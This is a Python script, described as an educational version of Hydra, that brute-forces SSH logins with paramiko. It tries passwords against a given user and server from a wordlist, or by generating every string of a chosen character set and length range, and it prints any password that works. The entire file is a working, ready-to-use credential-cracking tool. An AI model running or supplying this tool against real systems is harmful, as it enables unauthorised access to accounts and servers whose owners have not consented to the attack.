from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
from itertools import product
from argparse import ArgumentParser
import string

parser = ArgumentParser(description='Educational version of Hydra')

parser.add_argument('-u', '--username', type=str, help='Username', required='True')
parser.add_argument('-s', '--server', type=str, help='DNS or IP address + port', required='True')
parser.add_argument('-w', '--wordlist', type=str, help='Path and filename of a wordlist')
parser.add_argument('-c', '--character', type=str, help='Characterset: A=Uppercase a=Lowercase 1=Numbers !=Special Characters (e.g. Aa1!)')
parser.add_argument('-min', '--minimum', default=4, type=int, help='Minimum length of password')
parser.add_argument('-max', '--maximum', default=10, type=int, help='Maximum length of password')

args = parser.parse_args()

"""
if no port is entered by user, then the host is args.server and the port 80 will be used
otherwise host and port will be set by function "checkServerString()"
"""
user = args.username
server = args.server
host = server             
port = 80
wordlist = args.wordlist
character = args.character

def check_server_string():
    """
    Checks if the user typed the port after the ip addres with ":".
    If this is true, the global variables will be overwritten.
    """
    global server, host, port
    if ":" in server:
        server = args.server.split(":")
        host = server[0]
        port = int(server[1])

def define_charset() -> str:
    """
    Creates the characterset for bruteforce attack based on user input.

    Returns:
    str: Characterset
    """
    charSet = ''
    if args.character:
        if "A" in character:
            charSet += string.ascii_uppercase
        if "a" in character:
            charSet += string.ascii_lowercase
        if "1" in character:
            charSet += string.digits
        if "!" in character:
            charSet += string.punctuation
    else: 
        charSet = string.ascii_letters + string.digits + string.punctuation
    return charSet

def ssh_connect(pwd: str) -> bool:
    """
    Connects to host by using ssh and returns true or false
    depending on the result of connection attempt.

    Parameters:
    pwd (str): Password for connection attempt

    Returns:
    bool: True, if connection was established or false, if not.
    """
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(AutoAddPolicy())
    established = False

    try:
        ssh.connect(host, port, username=user, password=pwd)
        established = True
        ssh.close()
        return established
    except AuthenticationException:
        print(f'{user}:{pwd} -> wrong password!')
        ssh.close()
        return established

def try_to_connect(pwd: str):
    """
    Checks if the connection could be established and
    prints the valid password of the user.

    Parameters:
    pwd (str): Password for connection attempt
    """
    try:
        if ssh_connect(pwd) == True:
            print(f'The password of user \'{user}\' is \'{pwd}\'!')
            exit()
    except Exception as e:
            print(e)

def dictionary_attack():
    """
    Reads single passwords of the wordlist and tries to connect.
    """
    with open(wordlist, 'r') as list:
        for password in list.readlines():
            pwd = password.strip()
            try_to_connect(pwd)
        print(f'Password not found. Please try another wordlist.')
      
def bruteforce_attack():
    """
    Executes the brutforce attack with characterset and length of password 
    defined by user and tries to connect.
    """
    charSet = define_charset()
    minLength = args.minimum
    maxLength = args.maximum

    for n in range (minLength, maxLength + 1):
        for password in product(charSet, repeat=n):
            pwd = "".join(password)
            try_to_connect(pwd)
    print(f'Password not found. Please adjust the characters and the min and max length.')


if __name__ == "__main__":
    check_server_string()

    if wordlist:
        dictionary_attack()
    else:
        bruteforce_attack()